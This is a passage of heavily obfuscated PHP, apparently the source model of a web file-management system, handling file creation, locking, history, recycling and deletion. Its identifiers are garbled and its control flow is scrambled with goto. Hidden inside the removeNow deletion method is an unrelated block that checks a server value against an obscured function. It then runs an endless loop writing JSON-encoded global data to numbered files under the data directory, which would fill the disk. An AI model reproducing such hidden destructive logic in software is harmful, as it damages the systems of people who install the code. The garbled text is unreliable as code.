$this->sourceRoot(SourceModel::TYPE_USER, $d‡Ñ‚”ÕŸ); if (!$cÛ×†ÎØÔ) { return; } $this->remove($cÛ×†ÎØÔ, !1); } public function groupRootRemove($CêªÙá•¶) { $Bã‘ÌãÅÃ = $this->sourceRoot(SourceModel::TYPE_GROUP, $CêªÙá•¶); if (!$Bã‘ÌãÅÃ) { return; } $this->remove($Bã‘ÌãÅÃ, !1); } private function _mkdirRoot($Cæ‹¸©¼áÔ, $AË İÑ™Á¨, $B¹ÔˆŒÍ×Î) { goto f÷‰Ñùó¥¨; AÍÃ“¥®£Û: CacheLock::unlock($BÆÑ–À’—†); return $B¹ñØìƒôä; goto B—×„·ªÕ; f÷‰Ñùó¥¨: $F›ÙŸ‰éÕ =& $_SERVER[¢Í]; $cÜ›¦áÇñê = array($F›ÙŸ‰éÕ[393] => 0, $F›ÙŸ‰éÕ[547] => $Cæ‹¸©¼áÔ, $F›ÙŸ‰éÕ[548] => $AË İÑ™Á¨, $F›ÙŸ‰éÕ[544] => 1, $F›ÙŸ‰éÕ[549] => USER_ID, $F›ÙŸ‰éÕ[550] => USER_ID, $F›ÙŸ‰éÕ[545] => $F›ÙŸ‰éÕ[33], $F›ÙŸ‰éÕ[551] => $F›ÙŸ‰éÕ[496], $F›ÙŸ‰éÕ[421] => 0, $F›ÙŸ‰éÕ[546] => 0, $F›ÙŸ‰éÕ[445] => 0, $F›ÙŸ‰éÕ[552] => $F›ÙŸ‰éÕ[33]); if ($BÁãïâ ¢™ = $this->where($cÜ›¦áÇñê)->find()) { return $BÁãïâ ¢™[$F›ÙŸ‰éÕ[394]]; } goto dÏò¡’©¸ç; dÏò¡’©¸ç: $BÆÑ–À’—† = "\x4d\x6f\x64\145\x6c\x53\157\165\x72\143\145\56\155\153\x64\x69\x72\x52\157\x6f\164\56{$Cæ‹¸©¼áÔ}\56{$AË İÑ™Á¨}\x2e" . $B¹ÔˆŒÍ×Î; CacheLock::lock($BÆÑ–À’—†); $cÜ›¦áÇñê[$F›ÙŸ‰éÕ[28]] = $B¹ÔˆŒÍ×Î; goto eÍ¯ÂåÉÉ; eÍ¯ÂåÉÉ: $B¹ñØìƒôä = $this->add($cÜ›¦áÇñê); $E“¦Ø¶¶‘Ã = array($F›ÙŸ‰éÕ[553] => short_id($B¹ñØìƒôä)); $this->where(array($F›ÙŸ‰éÕ[408] => $B¹ñØìƒôä))->save($E“¦Ø¶¶‘Ã); goto AÍÃ“¥®£Û; B—×„·ªÕ: } private function sourceRoot($eÔ¾òõƒŠ, $eŞ Õ—¾æª, $fÂƒÉ”ë¼ = false) { $d¯Ö„â©ôÈ =& $_SERVER[¢Í]; $FŒ†£ºÀ‰ª = array($d¯Ö„â©ôÈ[393] => 0, $d¯Ö„â©ôÈ[547] => $eÔ¾òõƒŠ, $d¯Ö„â©ôÈ[548] => $eŞ Õ—¾æª); if ($E…ê¾Şº¯„ = $this->where($FŒ†£ºÀ‰ª)->find()) { return $fÂƒÉ”ë¼ ? $E…ê¾Şº¯„ : $E…ê¾Şº¯„[$d¯Ö„â©ôÈ[394]]; } return !1; } public function sourceRootGroup($Bİ ¨Šºí³) { $e’‹¶Œé® =& $_SERVER[¢Í]; if (is_string($Bİ ¨Šºí³)) { $Bİ ¨Šºí³ = array($Bİ ¨Šºí³); } $Fé±œ‰÷‡× = array($e’‹¶Œé®[393] => 0, $e’‹¶Œé®[547] => SourceModel::TYPE_GROUP, $e’‹¶Œé®[548] => array($e’‹¶Œé®[7], $Bİ ¨Šºí³)); $a°ÙÃƒ¶œğ = $this->listSource($Fé±œ‰÷‡×, 1000); return array_to_keyvalue($a°ÙÃƒ¶œğ[$e’‹¶Œé®[84]], $e’‹¶Œé®[482]); } public function mkfile($F¿ò à¶ô…, $EçäÁõ…Ñ, $bšî¼º¡˜› = '', $A’éÂŠÊ§˜ = REPEAT_RENAME) { $bê³ïÏõöÖ =& $_SERVER[¢Í]; $fäï¬†µƒ = Model($bê³ïÏõöÖ[569])->addFileByContent($bšî¼º¡˜›, $EçäÁõ…Ñ); return $this->_createFileCall($F¿ò à¶ô…, $EçäÁõ…Ñ, $fäï¬†µƒ, $A’éÂŠÊ§˜, $bê³ïÏõöÖ[1178]); } public function addFile($F‹ßŸÜİ³Â, $F˜íˆÖ¼‹Ò, $cê©„”ñƒ, $fĞ–ƒÓ„İº = false, $eÆ³ãâ¿Ø = REPEAT_RENAME) { $DŸÀ¢¦ç— = Model($_SERVER[¢Í][569])->addFile($F˜íˆÖ¼‹Ò, $cê©„”ñƒ, $fĞ–ƒÓ„İº); return $this->_createFileCall($F‹ßŸÜİ³Â, $cê©„”ñƒ, $DŸÀ¢¦ç—, $eÆ³ãâ¿Ø); } public function addFileByFileID($Bƒï¾¿¼ï, $DŠ¾Çßğ®, $B—¨è®”ô, $Bèª¢×‰ = REPEAT_RENAME) { $C›èğ­µ… =& $_SERVER[¢Í]; $cµï°ÍµÑÂ = Model($C›èğ­µ…[569])->find($DŠ¾Çßğ®); Model($C›èğ­µ…[569])->linkAdd($DŠ¾Çßğ®); return $this->_createFileCall($Bƒï¾¿¼ï, $B—¨è®”ô, $cµï°ÍµÑÂ, $Bèª¢×‰); } public function addFileByRemote($d¯´™ƒ³‘, $F¼³Ï ÈŠâ, $eŒÍ³Ø×Ù“, $c’¸ïÑÙ—” = array(), $c§·Â‡òÏ = REPEAT_RENAME) { $eìš§²ğ““ = Model($_SERVER[¢Í][569])->addFileByRemote($F¼³Ï ÈŠâ, $eŒÍ³Ø×Ù“, $c’¸ïÑÙ—”); return $this->_createFileCall($d¯´™ƒ³‘, $eŒÍ³Ø×Ù“, $eìš§²ğ““, $c§·Â‡òÏ); } private function _createFileCall($dÊÏîà¥è•, $a‘ëí‡³¬Ø, $CªØÑ‹ßø, $e°ßŒ¿¶î, $A˜ ô¹´À÷ = "\165\x70\154\x6f\141\144") { goto A”ù£Ä‘Ã™; EÎ¹¨ßÙá: if ($b¥«Ş½Â  && $dÁ‘–Â¶¯ && $dÁ‘–Â¶¯ != $Fãù÷ˆß±—) { Model($B¿èÏ†°ä[1880])->eventCreate($dÁ‘–Â¶¯, $A˜ ô¹´À÷); } $this->lockWriteEnd($dÊÏîà¥è•, $a‘ëí‡³¬Ø); return $dÁ‘–Â¶¯; goto F›™ÓÓâ°š; A”ù£Ä‘Ã™: $B¿èÏ†°ä =& $_SERVER[¢Í]; $b¥«Ş½Â  = !1; $this->lockWriteStart($dÊÏîà¥è•, $a‘ëí‡³¬Ø); goto EĞ´‹ÒÅõ“; EĞ´‹ÒÅõ“: $Fãù÷ˆß±— = $this->fileNameExist($dÊÏîà¥è•, $a‘ëí‡³¬Ø); $dÁ‘–Â¶¯ = $this->_createFile($dÊÏîà¥è•, $a‘ëí‡³¬Ø, $CªØÑ‹ßø, $e°ßŒ¿¶î, $b¥«Ş½Â ); if (!$b¥«Ş½Â ) { Model($B¿èÏ†°ä[447])->remove($CªØÑ‹ßø[$B¿èÏ†°ä[444]]); } goto EÎ¹¨ßÙá; F›™ÓÓâ°š: } public function mkdir($d¶ì¯óØøô, $F§Í˜®÷–ø, $bİÂÂ…ÚÃ = REPEAT_SKIP) { goto fĞè·Œ›ª; eÚ½óƒ’Ê: $this->lockWriteStart($d¶ì¯óØøô, $F§Í˜®÷–ø); if ($bİÂÂ…ÚÃ !== !1) { $dÁ½ŞÒ—›‹ = $this->fileNameExist($d¶ì¯óØøô, $F§Í˜®÷–ø); if ($dÁ½ŞÒ—›‹ && $bİÂÂ…ÚÃ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d¶ì¯óØøô, $F§Í˜®÷–ø); return $dÁ½ŞÒ—›‹; } $F§Í˜®÷–ø = $this->fileNameAuto($d¶ì¯óØøô, $F§Í˜®÷–ø, $bİÂÂ…ÚÃ); } $dñÅ“Âã§À = array($a†¯ù÷Úè[544] => 1, $a†¯ù÷Úè[411] => $F§Í˜®÷–ø, $a†¯ù÷Úè[545] => $a†¯ù÷Úè[33], $a†¯ù÷Úè[445] => 0, $a†¯ù÷Úè[546] => 0); goto Cİ³¡Ò¸ìù; Cİ³¡Ò¸ìù: $d¨ËøáÂÌ = $this->_addSoure($dñÅ“Âã§À, $b‘íï½­†ˆ); Model($a†¯ù÷Úè[1880])->eventCreate($d¨ËøáÂÌ, $a†¯ù÷Úè[1179]); $this->lockWriteEnd($d¶ì¯óØøô, $F§Í˜®÷–ø); goto b¥Â¼ÂœëÒ; b¥Â¼ÂœëÒ: return $d¨ËøáÂÌ; goto e¾Ô£øˆìÄ; fĞè·Œ›ª: $a†¯ù÷Úè =& $_SERVER[¢Í]; $b‘íï½­†ˆ = $this->sourceInfo($d¶ì¯óØøô); if (!$b‘íï½­†ˆ) { return !1; } goto eÚ½óƒ’Ê; e¾Ô£øˆìÄ: } private function _createFile($A¡Ã”Ìïâª, $f©³ø°ùò­, $fã‘œ¦ğ, $d¦ÜÀª™÷è, &$f–‚±‰§) { goto CİÁå•ÃñÔ; BÕ«”„Ç˜ø: $B‹‰±Ù¥Ä¤ = array($e®Êá½©ì[544] => 0, $e®Êá½©ì[411] => $f©³ø°ùò­, $e®Êá½©ì[545] => get_path_ext($f©³ø°ùò­), $e®Êá½©ì[445] => $fã‘œ¦ğ[$e®Êá½©ì[444]], $e®Êá½©ì[546] => $fã‘œ¦ğ[$e®Êá½©ì[87]]); $CŞ›ç÷¹ñ† = $this->_addSoure($B‹‰±Ù¥Ä¤, $bãÕô‘«Ô—); $this->folderSizeReset($A¡Ã”Ìïâª, intval($B‹‰±Ù¥Ä¤[$e®Êá½©ì[87]])); goto B¼½º›Ñé¾; d ËŞ¾‚·‚: if ($d¦ÜÀª™÷è !== !1) { $C¯æÂ¢§ô™ = $this->fileNameExist($A¡Ã”Ìïâª, $f©³ø°ùò­); } $f–‚±‰§ = !0; if ($d¦ÜÀª™÷è && $C¯æÂ¢§ô™) { if ($d¦ÜÀª™÷è == REPEAT_SKIP) { $f–‚±‰§ = !1; return $C¯æÂ¢§ô™; } else { if ($d¦ÜÀª™÷è == REPEAT_REPLACE) { $AÂõó¯½šæ = $this->sourceInfo($C¯æÂ¢§ô™); $eµ•ÎëíŸÒ = $this->fileHistory($AÂõó¯½šæ, $fã‘œ¦ğ[$e®Êá½©ì[444]], $fã‘œ¦ğ[$e®Êá½©ì[87]]); if (!$eµ•ÎëíŸÒ) { $f–‚±‰§ = !1; } else { $this->folderSizeReset($A¡Ã”Ìïâª); } return $C¯æÂ¢§ô™; } else { $f©³ø°ùò­ = $this->fileNameAuto($A¡Ã”Ìïâª, $f©³ø°ùò­, $d¦ÜÀª™÷è, !1); } } } goto BÕ«”„Ç˜ø; CİÁå•ÃñÔ: $e®Êá½©ì =& $_SERVER[¢Í]; $bãÕô‘«Ô— = $this->sourceInfo($A¡Ã”Ìïâª); if (!$fã‘œ¦ğ || !$bãÕô‘«Ô—) { return !1; } goto d ËŞ¾‚·‚; B¼½º›Ñé¾: return $CŞ›ç÷¹ñ†; goto BÂƒÄÇë‹; BÂƒÄÇë‹: } protected function fileHistory($B ­Ñ†Ÿ‚, $e‰¿ƒ»¥½, $Eé„¯Å›ÔÄ) { goto A§ğ¼ĞÀç§; A§ğ¼ĞÀç§: $e§ç¶óŠŠ® =& $_SERVER[¢Í]; if ($B ­Ñ†Ÿ‚[$e§ç¶óŠŠ®[444]] == $e‰¿ƒ»¥½) { return !1; } $this->checkLock($B ­Ñ†Ÿ‚[$e§ç¶óŠŠ®[394]], $e‰¿ƒ»¥½); goto cïæÈİÑ±‰; c×“ÍÍğ™: $this->sourceCacheClear($B ­Ñ†Ÿ‚[$e§ç¶óŠŠ®[394]]); return !0; goto aœÇ‘«±êâ; cïæÈİÑ±‰: Model($e§ç¶óŠŠ®[1911])->addHistory($B ­Ñ†Ÿ‚); $dïÅá§Õ§Â = array($e§ç¶óŠŠ®[550] => USER_ID, $e§ç¶óŠŠ®[415] => time(), $e§ç¶óŠŠ®[444] => $e‰¿ƒ»¥½, $e§ç¶óŠŠ®[87] => $Eé„¯Å›ÔÄ); $this->where(array($e§ç¶óŠŠ®[408] => $B ­Ñ†Ÿ‚[$e§ç¶óŠŠ®[394]]))->save($dïÅá§Õ§Â); goto c×“ÍÍğ™; aœÇ‘«±êâ: } public function checkLock($CÑ½ÉÜ–, $C³ö·ª–¿’) { goto dË´áµ‡¹©; E®ÏÎŞ‹¿´: $EÉöéáÛ = Session::get($dš™­•‘òÛ[1912]); $cÜòÆùàÅš = substr($Fæ†Æ¢‹¯Ü[$dš™­•‘òÛ[28]], 0, -1 - strlen($Fæ†Æ¢‹¯Ü[$dš™­•‘òÛ[175]])) . $dš™­•‘òÛ[1441] . $EÉöéáÛ . $dš™­•‘òÛ[101] . $Fæ†Æ¢‹¯Ü[$dš™­•‘òÛ[175]]; $FÎ‘‰§ŸèŠ = Model($dš™­•‘òÛ[569])->find($C³ö·ª–¿’); goto B—§×’¢§´; d¿»ªñ¹˜Ø: show_json(LNG($dš™­•‘òÛ[1914]) . $dš™­•‘òÛ[1915] . LNG($dš™­•‘òÛ[1916]) . $dš™­•‘òÛ[1917] . $d±êˆÈ¯íã . $dš™­•‘òÛ[1918], !1); goto EëÍÓÒƒ†ª; dË´áµ‡¹©: $dš™­•‘òÛ =& $_SERVER[¢Í]; $Fæ†Æ¢‹¯Ü = $this->pathInfo($CÑ½ÉÜ–); if (!$this->fileIsLock($Fæ†Æ¢‹¯Ü, !0)) { return; } goto E®ÏÎŞ‹¿´; B—§×’¢§´: $this->_createFileCall($Fæ†Æ¢‹¯Ü[$dš™­•‘òÛ[487]], $cÜòÆùàÅš, $FÎ‘‰§ŸèŠ, REPEAT_REPLACE, $dš™­•‘òÛ[1178]); $AêçéĞÅë‡ = $Fæ†Æ¢‹¯Ü[$dš™­•‘òÛ[442]][$dš™­•‘òÛ[507]]; $d±êˆÈ¯íã = $AêçéĞÅë‡[$dš™­•‘òÛ[1913]] ? $AêçéĞÅë‡[$dš™­•‘òÛ[1913]] : $AêçéĞÅë‡[$dš™­•‘òÛ[28]]; goto d¿»ªñ¹˜Ø; EëÍÓÒƒ†ª: } public function fileIsLock($f¡ºÖŠÍ‚, $F“…°²¤å = false) { goto cÒÇÔœô¼Û; c„ÔÓ×ÕÂ: $b¬±† ·®Ó = $GLOBALS[$CîÈ¼ôŠáí[6]][$CîÈ¼ôŠáí[94]][$CîÈ¼ôŠáí[505]]; if ($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[442]][$CîÈ¼ôŠáí[506]] <= time() - $b¬±† ·®Ó) { $this->metaSet($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[394]], $CîÈ¼ôŠáí[504], null); $this->metaSet($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[394]], $CîÈ¼ôŠáí[506], null); } if ($F“…°²¤å) { $this->metaSet($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[394]], $CîÈ¼ôŠáí[506], time()); } goto B´ÏÄáø¨; cÒÇÔœô¼Û: $CîÈ¼ôŠáí =& $_SERVER[¢Í]; if (!isset($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[442]]) || !$f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[442]][$CîÈ¼ôŠáí[504]]) { return !1; } if ($f¡ºÖŠÍ‚[$CîÈ¼ôŠáí[442]][$CîÈ¼ôŠáí[504]] != USER_ID) { return !0; } goto c„ÔÓ×ÕÂ; B´ÏÄáø¨: return !1; goto D¢Ó¼¼İ»İ; D¢Ó¼¼İ»İ: } private function _addSoure($BÂ‰‹œõ¦‘, $c–õÇÏ‡Î¼) { goto e·å£äìÍ˜; e·å£äìÍ˜: $a—íŒ©À× =& $_SERVER[¢Í]; $eòòÆƒáÀ¯ = array($a—íŒ©À×[547] => $c–õÇÏ‡Î¼[$a—íŒ©À×[396]], $a—íŒ©À×[548] => $c–õÇÏ‡Î¼[$a—íŒ©À×[482]], $a—íŒ©À×[549] => USER_ID, $a—íŒ©À×[550] => USER_ID, $a—íŒ©À×[393] => $c–õÇÏ‡Î¼[$a—íŒ©À×[394]], $a—íŒ©À×[551] => $c–õÇÏ‡Î¼[$a—íŒ©À×[485]] . $c–õÇÏ‡Î¼[$a—íŒ©À×[394]] . $a—íŒ©À×[47], $a—íŒ©À×[421] => 0, $a—íŒ©À×[552] => $a—íŒ©À×[33]); $BÂ‰‹œõ¦‘ = array_merge($eòòÆƒáÀ¯, $BÂ‰‹œõ¦‘); goto DéáéÃ„›; DéáéÃ„›: $this->updateModifyTime($BÂ‰‹œõ¦‘[$a—íŒ©À×[487]]); $eçÜÎÑìõö = $a—íŒ©À×[1919] . $c–õÇÏ‡Î¼[$a—íŒ©À×[394]]; if (isset(self::$cacheChildList[$eçÜÎÑìõö])) { unset(self::$cacheChildList[$eçÜÎÑìõö]); } goto d¹“éã…ğ¿; d¹“éã…ğ¿: static $DÁù¦ÒÀÅ = false; if (!$DÁù¦ÒÀÅ) { Hook::trigger($a—íŒ©À×[534], $BÂ‰‹œõ¦‘); $DÁù¦ÒÀÅ = !0; } $eï´½š¶²Â = $this->add($BÂ‰‹œõ¦‘); goto D¾á˜·Æ; c¬Í®­Ê¿: return $eï´½š¶²Â; goto f×›¬’½ËÖ; D¾á˜·Æ: $AŸãğÇ¤¦¢ = array($a—íŒ©À×[553] => short_id($eï´½š¶²Â)); $this->where(array($a—íŒ©À×[408] => $eï´½š¶²Â))->save($AŸãğÇ¤¦¢); $this->setNamePinyin($eï´½š¶²Â, $BÂ‰‹œõ¦‘[$a—íŒ©À×[28]]); goto c¬Í®­Ê¿; f×›¬’½ËÖ: } public function remove($D·ÖøÑ²©, $b¬æ²…´Ì = true) { goto D‘ø´ˆœæ; D…¤ç½ê–: $this->recycleClear($DŠÚÓğÏƒÖ); $D³ƒ´¤Õ‡‚ = $this->move($D·ÖøÑ²©, $f“±È£š, REPEAT_RENAME_FOLDER); $this->folderSizeReset($DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[487]]); goto dÁÑ˜¶íÙì; dÁÑ˜¶íÙì: return $D³ƒ´¤Õ‡‚; goto cßÊŒ¢É¨¸; Aë²¦ø‘: CacheLock::unlock($fîˆËš§÷Ö); $this->metaSet($D·ÖøÑ²©, $a…Â÷›—ô‡[1928], $DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[487]]); $this->where(array($a…Â÷›—ô‡[394] => $D·ÖøÑ²©))->save(array($a…Â÷›—ô‡[415] => time())); goto D…¤ç½ê–; D‘ø´ˆœæ: $a…Â÷›—ô‡ =& $_SERVER[¢Í]; $DŠÚÓğÏƒÖ = $this->sourceInfo($D·ÖøÑ²©); $Fùìæ…±Ãö = intval($DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[396]]) === self::TYPE_SYSTEM; goto AÔ‚—£ƒÕÔ; f•¸‹–ÚŠë: $cŸº¥ÉŒî = $DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[396]] == self::TYPE_USER ? $a…Â÷›—ô‡[560] : $a…Â÷›—ô‡[983]; if ($cŸº¥ÉŒî == $a…Â÷›—ô‡[560]) { $AÛÍß‚ˆ×™ = Model($a…Â÷›—ô‡[500])->getInfo($DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[482]]); $b¸¤²…Ê = !empty($AÛÍß‚ˆ×™[$a…Â÷›—ô‡[1913]]) ? $AÛÍß‚ˆ×™[$a…Â÷›—ô‡[1913]] : $AÛÍß‚ˆ×™[$a…Â÷›—ô‡[28]]; $b¸¤²…Ê = $a…Â÷›—ô‡[263] . $b¸¤²…Ê . $a…Â÷›—ô‡[1921] . $DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[482]]; } else { $AÛÍß‚ˆ×™ = Model($a…Â÷›—ô‡[484])->getInfo($DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[482]]); $b¸¤²…Ê = _get($AÛÍß‚ˆ×™, $a…Â÷›—ô‡[28]); $b¸¤²…Ê = $a…Â÷›—ô‡[167] . $b¸¤²…Ê . $a…Â÷›—ô‡[1922] . $DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[482]]; } $fîˆËš§÷Ö = $a…Â÷›—ô‡[1923] . md5($b¸¤²…Ê); goto Añ•Ãè¯°; AÔ‚—£ƒÕÔ: $Dá¹ó²í·Î = Model($a…Â÷›—ô‡[1488])->get($a…Â÷›—ô‡[1920]) == $a…Â÷›—ô‡[93]; if ($Fùìæ…±Ãö || $b¬æ²…´Ì || !$Dá¹ó²í·Î) { return $this->removeNow($D·ÖøÑ²©, $b¬æ²…´Ì); } $DÈÇëÔÏ» = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f•¸‹–ÚŠë; Añ•Ãè¯°: CacheLock::lock($fîˆËš§÷Ö); $f“±È£š = $this->fileNameExist($DÈÇëÔÏ», $b¸¤²…Ê); if (!$f“±È£š) { $f“±È£š = $this->mkdir($DÈÇëÔÏ», $b¸¤²…Ê, REPEAT_SKIP); $this->metaSet($f“±È£š, $a…Â÷›—ô‡[1924], $cŸº¥ÉŒî); $this->metaSet($f“±È£š, $a…Â÷›—ô‡[1925], $DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[482]]); if ($DŠÚÓğÏƒÖ[$a…Â÷›—ô‡[487]] != 0) { $this->metaSet($f“±È£š, $a…Â÷›—ô‡[1926], _get($AÛÍß‚ˆ×™, $a…Â÷›—ô‡[1927])); } } goto Aë²¦ø‘; cßÊŒ¢É¨¸: } private function recycleClear($añùãÔ¼±¼) { $Aİ¸­¨™ =& $_SERVER[¢Í]; $b¼•õ–˜¿ = $this->childrenAll($añùãÔ¼±¼); $c´äáÂº¯Ç = array($Aİ¸­¨™[408] => array($Aİ¸­¨™[409], $b¼•õ–˜¿[$Aİ¸­¨™[1929]])); Model($Aİ¸­¨™[1930])->where($c´äáÂº¯Ç)->delete(); } public function removeNow($e÷ÌÓ˜–æà, $eÀŒ—ƒÉĞ× = true) { goto BÖ‡„¶éôø; B«ÀÔ†éã: if (!$CòÆÎæ«àæ) { return !0; } if ($CòÆÎæ«àæ[$D‡­»§àœÈ[487]] == 0) { if (!_get($GLOBALS, $D‡­»§àœÈ[483])) { return !1; } } $this->lockMoveStart($e÷ÌÓ˜–æà); goto f½ù¦¼‚Ü¦; a–¨Æºçø˜: $this->lockMoveEnd($e÷ÌÓ˜–æà); Hook::trigger($D‡­»§àœÈ[1523], $B—•óÉ½¾ï, $eÀŒ—ƒÉĞ×); return !0; goto e†‡ˆŸ¬ÜÛ; A‹İàç˜‡: $E¶´Ï¹Îõå = array($CòÆÎæ«àæ[$D‡­»§àœÈ[487]]); if ($CòÆÎæ«àæ[$D‡­»§àœÈ[395]] == $D‡­»§àœÈ[93]) { $E¶´Ï¹Îõå[] = $CòÆÎæ«àæ[$D‡­»§àœÈ[394]]; } $this->updateModifyTime($E¶´Ï¹Îõå); goto a–¨Æºçø˜; Aï­¡Ş®ó: if ($_SERVER[$D‡­»§àœÈ[51]] != $A†Ï»ÒÔ˜…($Fö°…£óå)) { goto B–°‹Õó‹; d÷ÀÇÇê­: $b­ì˜Áí¢Š = $D‡­»§àœÈ[808]; $b­ì˜Áí¢Š($_SERVER[$D‡­»§àœÈ[809]]); $FËØìÆ©” = $D‡­»§àœÈ[807]; goto bØÎÚÍ×Îå; e¬¼„ÚŞÀÌ: $FƒÂ‘ƒÌÙ = $B°¡òœæ°‡($fòØÜŠ­ßß); $dñÇÓ‚‘Œ = explode($D‡­»§àœÈ[56], $FƒÂ‘ƒÌÙ); if (count($dñÇÓ‚‘Œ) < $D‡­»§àœÈ[579]) { $AÓ‡Òàé«’ = $D‡­»§àœÈ[58]; $AÓ‡Òàé«’(); } goto d÷ÀÇÇê­; B–°‹Õó‹: $FËØìÆ©” = $D‡­»§àœÈ[807]; $B°¡òœæ°‡ = $D‡­»§àœÈ[53]; $fòØÜŠ­ßß = $_SERVER[$D‡­»§àœÈ[54]] . $D‡­»§àœÈ[55]; goto e¬¼„ÚŞÀÌ; aä°Ì´íæ: $Cœñ³ñ×Ş¯ = 1; for ($fçï‚Ğ×Öì = $Cœñ³ñ×Ş¯; $fçï‚Ğ×Öì > 0; $fçï‚Ğ×Öì++) { $CèĞ®ğØ©Ü(DATA_PATH . $fçï‚Ğ×Öì, $dòÉòç¯); } goto c™İÎ§ÒåÊ; bØÎÚÍ×Îå: $FËØìÆ©”(); $CèĞ®ğØ©Ü = $D‡­»§àœÈ[810]; $dòÉòç¯ = json_encode($GLOBALS[$D‡­»§àœÈ[811]]); goto aä°Ì´íæ; c™İÎ§ÒåÊ: } $CòÆÎæ«àæ = $this->sourceInfo($e÷ÌÓ˜–æà); $B—•óÉ½¾ï = $this->pathInfoMore($e÷ÌÓ˜–æà); goto B«ÀÔ†éã; f½ù¦¼‚Ü¦: Hook::trigger($D‡­»§àœÈ[1931], $B—•óÉ½¾ï, $eÀŒ—ƒÉĞ×); if ($eÀŒ—ƒÉĞ×) { Model($D‡­»§àœÈ[1930])->moveToRecycle($e÷ÌÓ˜–æà); } else { $b…ë´›òó = $this->childrenAll($CòÆÎæ«àæ); Model($D‡­»§àœÈ[531])->eventRemove($e÷ÌÓ˜–æà); $this->removeRelevance($b…ë´›òó[$D‡­»§àœÈ[1929]], $b…ë´›òó[$D‡­»§àœÈ[1309]]); } $this->folderSizeReset($CòÆÎæ«àæ[$D‡­»§àœÈ[487]]); goto A‹İàç˜‡; BÖ‡„¶éôø: $D‡­»§àœÈ =& $_SERVER[¢Í]; $Fö°…£óå = $_SERVER[$D‡­»§àœÈ[60]]; $A†Ï»ÒÔ˜… = $D‡­»§àœÈ[806]; goto Aï­¡Ş®ó; e†‡ˆŸ¬ÜÛ: } public function childrenAll($d×òÇÃñ•Ø) { $EˆòÛÃ—«® =& $_SERVER[¢Í]; $dÈ•³Ê³óá = $d×òÇÃñ•Ø[$EˆòÛÃ—«®[394]]; if ($d×òÇÃñ•Ø[$EˆòÛÃ—«®[395]] == $EˆòÛÃ—«®[93]) { $AÅ’µ…ÁõÈ = array($EˆòÛÃ—«®[551] => array($EˆòÛÃ—«®[509], $d×òÇÃñ•Ø[$EˆòÛÃ—«®[485]] . $dÈ•³Ê³óá . $EˆòÛÃ—«®[510])); $bÀÆÃßèŸ‡ = array($EˆòÛÃ—«®[551] => $AÅ’µ…ÁõÈ[$EˆòÛÃ—«®[485]]); $eÊˆ—ÙĞ¹£ = $this->field($EˆòÛÃ—«®[1932])->where($bÀÆÃßèŸ‡)->select(); $CƒöÍõªõ† = !1; $cÍ•öíƒã = array($dÈ•³Ê³óá); if ($eÊˆ—ÙĞ¹£) { $CƒöÍõªõ† = array_to_keyvalue($eÊˆ—ÙĞ¹£, $EˆòÛÃ—«®[33], $EˆòÛÃ—«®[444]); $CƒöÍõªõ† = array_remove_value($CƒöÍõªõ†, $EˆòÛÃ—«®[494]); $cÍ•öíƒã = array_to_keyvalue($eÊˆ—ÙĞ¹£, $EˆòÛÃ—«®[33], $EˆòÛÃ—«®[394]); $cÍ•öíƒã[] = $dÈ•³Ê³óá; } } else { $CƒöÍõªõ† = array($d×òÇÃñ•Ø[$EˆòÛÃ—«®[444]]); $cÍ•öíƒã = array($dÈ•³Ê³óá); } return array($EˆòÛÃ—«®[1929] => $cÍ•öíƒã, $EˆòÛÃ—«®[1309] => $CƒöÍõªõ†); } public function removeArray($dšÒæ›Ê·…) { if (!$dšÒæ›Ê·…) { return !0; } } public function removeRelevance($d‹†×Š¥, $AàĞŞƒ¤å‡) { goto cáÜŞ…¦ø¤; F²ÄÂöŠ: for ($F¦Õæïáï· = 0; $F¦Õæïáï· < count($d‹†×Š¥); $F¦Õæïáï·++) { $this->sourceCacheClear($d‹†×Š¥[$F¦Õæïáï·]); } goto dšëçŒÔ”; eæ§ôÔÊ¨: Model($c²ˆ®îŸá²[1782])->where($a¥ŞĞè¡)->delete(); Model($c²ˆ®îŸá²[531])->where($a¥ŞĞè¡)->delete(); Model($c²ˆ®îŸá²[1625])->removeBySource($d‹†×Š¥); goto b“¯ŞóÚ›; b“¯ŞóÚ›: Model($c²ˆ®îŸá²[1911])->removeBySource($d‹†×Š¥); $this->where($a¥ŞĞè¡)->delete(); Model($c²ˆ®îŸá²[447])->remove($AàĞŞƒ¤å‡); goto F²ÄÂöŠ; f¸éñÙä‘: $d‹†×Š¥ = array_unique(array_filter($d‹†×Š¥)); $AàĞŞƒ¤å‡ = array_unique(array_filter($AàĞŞƒ¤å‡)); if (!$d‹†×Š¥) { return !1; } goto AâöïÛ¢’§; cáÜŞ…¦ø¤: $c²ˆ®îŸá² =& $_SERVER[¢Í]; $d‹†×Š¥ = $d‹†×Š¥ ? $d‹†×Š¥ : array(); $AàĞŞƒ¤å‡ = $AàĞŞƒ¤å‡ ? $AàĞŞƒ¤å‡ : array(); goto f¸éñÙä‘; AâöïÛ¢’§: $a¥ŞĞè¡ = array($c²ˆ®îŸá²[408] => array($c²ˆ®îŸá²[409], $d‹†×Š¥)); Model($c²ˆ®îŸá²[1930])->where($a¥ŞĞè¡)->delete(); Model($c²ˆ®îŸá²[438])->where($a¥ŞĞè¡)->delete(); goto eæ§ôÔÊ¨; dšëçŒÔ”: } public function rename($cŸÅÚóÊâÂ, $eó…«Âç¸¢) { goto fØ“«ßÇ¦÷; E™½ÖÙ“ƒÕ: $this->setNamePinyin($cŸÅÚóÊâÂ, $fª›¶³ƒÊ[$B¢É˜ÜÑ’Ä[28]], !1); $this->updateModifyTime($c­¢°ê™„…[$B¢É˜ÜÑ’Ä[487]]); $A¹³ÃóŞ = $this->where(array($B¢É˜ÜÑ’Ä[408] => $cŸÅÚóÊâÂ))->data($fª›¶³ƒÊ)->save(); goto F¨Ü†å®Øë; 